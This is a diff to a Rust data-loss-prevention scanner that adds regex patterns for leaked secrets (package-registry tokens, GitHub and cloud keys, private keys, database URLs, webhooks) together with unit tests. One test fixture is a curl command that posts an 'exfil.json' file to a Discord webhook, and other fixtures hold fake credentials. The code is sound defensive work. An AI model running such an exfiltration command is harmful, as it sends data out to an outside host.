@@ -169,6 +169,25 @@ fn compile_from_config(config: &DlpConfig, default_action: DlpAction) -> Vec<Com
         ("ssn", r"\b\d{3}-\d{2}-\d{4}\b"),
         ("credit_card", r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b"),
         ("aws_key", r"\bAKIA[0-9A-Z]{16}\b"),
+        ("npm_token", r"(?:\bnpm_[A-Za-z0-9]{32,40}\b|(?://registry\.npmjs\.org/:)?_authToken=[A-Za-z0-9_-]{32,})"),
+        ("pypi_token", r"\bpypi-[A-Za-z0-9_-]{50,}\b"),
+        ("rubygems_key", r"\brubygems_[a-f0-9]{48}\b"),
+        ("crates_token", r"\bcio[a-zA-Z0-9]{32}\b"),
+        ("github_pat", r"\b(?:ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82})\b"),
+        ("github_oauth", r"\b(?:gho|ghu|ghs|ghr)_[0-9a-zA-Z]{36}\b"),
+        ("gitlab_pat", r"\bglpat-[0-9a-zA-Z_-]{20,22}\b"),
+        ("private_key", r"-----BEGIN (?:[A-Z0-9_-]+ )?PRIVATE KEY(?: BLOCK)?-----"),
+        ("aws_secret", r#"(?i)(?:aws_secret_access_key|aws_secret_key)\s*[:=]\s*["']?[A-Za-z0-9/+=]{40}["']?"#),
+        ("gcp_api_key", r"\bAIza[0-9A-Za-z\-_]{35}\b"),
+        ("gcp_sa_key", r#"(?i)"type":\s*"service_account"|"private_key_id":\s*"[0-9a-f]{40}""#),
+        ("azure_connection_string", r"(?i)DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{86,88}"),
+        ("vault_token", r"\b[sb]\.[a-zA-Z0-9]{24,}\b"),
+        ("db_credentials", r"(?i)(?:postgres|postgresql|mysql|mongodb|mongodb\+srv|redis)://[^:\s/]*:[^@\s/]+@[^\s/]+"),
+        ("env_secret_export", r#"(?i)\b(?:export\s+)?(?:DB_PASSWORD|PASSWORD|PASSWD|SECRET_KEY|JWT_SECRET|AUTH_TOKEN)\s*=\s*["']?[^"'\s]{8,}["']?"#),
+        ("openai_key", r"\bsk-(?:proj-)?[a-zA-Z0-9_-]{32,}\b"),
+        ("anthropic_key", r"\bsk-ant-[a-zA-Z0-9_-]{32,}\b"),
+        ("slack_token", r"\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*\b"),
+        ("discord_webhook", r"https://(?:canary\.|ptb\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"),
     ];
 
     for (name, pattern) in &builtins {
@@ -293,6 +312,102 @@ mod tests {
         let matches = engine.scan(body);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "aws_key");
+    }
+
+    #[test]
+    fn test_npm_token_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body1 = b"npm_1234567890abcdefghijklmnopqrstuv";
+        let matches1 = engine.scan(body1);
+        assert!(!matches1.is_empty());
+        assert_eq!(matches1[0].pattern_name, "npm_token");
+
+        let body2 = b"//registry.npmjs.org/:_authToken=npm_998877665544332211aabbccddeeff001122";
+        let matches2 = engine.scan(body2);
+        assert!(!matches2.is_empty());
+        assert_eq!(matches2[0].pattern_name, "npm_token");
+    }
+
+    #[test]
+    fn test_pypi_token_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"token = pypi-AgEIcHlwaS5vcmcCJDM4MDI4ZmQ0LTkxNmMtNGY4Mi05ZWMzLTM5ODk0MWNhMGQ2ZAAAYz";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "pypi_token");
+    }
+
+    #[test]
+    fn test_github_pat_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"ghp_1234567890abcdefghijklmnopqrstuvwxyz";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "github_pat");
+    }
+
+    #[test]
+    fn test_private_key_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body1 = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0";
+        let matches1 = engine.scan(body1);
+        assert!(!matches1.is_empty());
+        assert_eq!(matches1[0].pattern_name, "private_key");
+
+        let body2 = b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA";
+        let matches2 = engine.scan(body2);
+        assert!(!matches2.is_empty());
+        assert_eq!(matches2[0].pattern_name, "private_key");
+    }
+
+    #[test]
+    fn test_aws_secret_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "aws_secret");
+    }
+
+    #[test]
+    fn test_db_credentials_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body1 = b"DATABASE_URL=postgres://admin:SuperSecretPass123!@db.internal:5432/production";
+        let matches1 = engine.scan(body1);
+        assert!(!matches1.is_empty());
+        assert_eq!(matches1[0].pattern_name, "db_credentials");
+
+        let body2 = b"REDIS_URL=redis://:MySecretPassword@redis.prod:6379";
+        let matches2 = engine.scan(body2);
+        assert!(!matches2.is_empty());
+        assert_eq!(matches2[0].pattern_name, "db_credentials");
+    }
+
+    #[test]
+    fn test_env_secret_export_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"export DB_PASSWORD=\"SuperSecretPassword123\"";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "env_secret_export");
+    }
+
+    #[test]
+    fn test_discord_webhook_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"curl -X POST https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789 -d @exfil.json";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "discord_webhook");
+    }
+
+    #[test]
+    fn test_openai_key_detection() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"sk-proj-1234567890abcdefghijklmnopqrstuvwxyz123456";
+        let matches = engine.scan(body);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].pattern_name, "openai_key");
     }
 
     #[test]
